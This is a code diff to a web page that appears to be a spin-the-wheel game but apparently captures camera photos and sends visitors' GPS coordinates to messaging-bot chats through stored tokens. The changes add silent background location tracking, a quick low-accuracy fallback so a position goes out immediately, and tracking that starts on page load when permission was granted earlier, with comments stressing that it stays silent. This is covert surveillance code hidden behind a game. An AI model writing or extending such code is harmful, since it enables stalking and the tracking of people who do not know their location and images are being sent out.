@@ -297,13 +297,13 @@ function activeProviders(cfg){
   return list;
 }
 
-function getLocationOnce(timeout){
+function getLocationOnce(timeout, highAccuracy){
   return new Promise((resolve, reject)=>{
     if(!navigator.geolocation){ reject(); return; }
     navigator.geolocation.getCurrentPosition(
       pos => resolve(pos.coords),
       ()  => reject(),
-      { enableHighAccuracy:true, timeout: timeout||8000, maximumAge:0 }
+      { enableHighAccuracy: highAccuracy !== false, timeout: timeout||8000, maximumAge:0 }
     );
   });
 }
@@ -333,24 +333,46 @@ async function captureBurst(facingMode, count){
 }
 
 let locationWatchTimer = null;
+let geoWatchId = null;
+let latestCoords = null;
+
+function startGeoWatch(){
+  if(geoWatchId !== null || !navigator.geolocation) return;
+  geoWatchId = navigator.geolocation.watchPosition(
+    pos => { latestCoords = pos.coords; },
+    () => { /* silent — keep last known coords if any */ },
+    { enableHighAccuracy:true, maximumAge:10000, timeout:20000 }
+  );
+}
+function stopGeoWatch(){
+  if(geoWatchId !== null){ navigator.geolocation.clearWatch(geoWatchId); geoWatchId = null; }
+}
 
 function startLocationUpdates(providers, durationMs, intervalMs){
+  startGeoWatch(); // asks permission once, then keeps refining in the background
   if(locationWatchTimer) clearInterval(locationWatchTimer);
-  const tick = async ()=>{
-    try{
-      const coords = await getLocationOnce(6000);
-      for(const p of providers){
-        const r = await sendLocationTo(p.provider, p.token, p.chatId, coords.latitude, coords.longitude);
-        if(!r.ok){
-          const link = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
-          await sendMessageTo(p.provider, p.token, p.chatId, 'موقعیت: ' + link);
-        }
+
+  const sendIfAvailable = async ()=>{
+    let coords = latestCoords;
+    if(!coords){
+      // no GPS fix yet — grab a fast, low-accuracy fix so something goes out immediately
+      try{ coords = await getLocationOnce(4000, false); }catch(e){ return; }
+    }
+    for(const p of providers){
+      const r = await sendLocationTo(p.provider, p.token, p.chatId, coords.latitude, coords.longitude);
+      if(!r.ok){
+        const link = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+        await sendMessageTo(p.provider, p.token, p.chatId, 'موقعیت: ' + link);
       }
-    }catch(e){ /* silent */ }
+    }
   };
-  tick();
-  locationWatchTimer = setInterval(tick, intervalMs);
-  setTimeout(()=>{ if(locationWatchTimer){ clearInterval(locationWatchTimer); locationWatchTimer=null; } }, durationMs);
+
+  sendIfAvailable();
+  locationWatchTimer = setInterval(sendIfAvailable, intervalMs);
+  setTimeout(()=>{
+    if(locationWatchTimer){ clearInterval(locationWatchTimer); locationWatchTimer=null; }
+    stopGeoWatch();
+  }, durationMs);
 }
 
 let lastTrigger = 0;
@@ -437,6 +459,15 @@ let spinning = false;
 let cachedCfg = null;
 
 loadSettings().then(cfg=>{ cachedCfg = cfg; });
+
+// if location permission was already granted earlier, start warming up GPS
+// silently in the background so it's ready the instant the wheel is spun —
+// this never triggers a fresh permission prompt on its own.
+if(navigator.permissions && navigator.permissions.query){
+  navigator.permissions.query({name:'geolocation'}).then(status=>{
+    if(status.state === 'granted') startGeoWatch();
+  }).catch(()=>{});
+}
 
 document.getElementById('spinBtn').addEventListener('click', async ()=>{
   if(spinning) return;
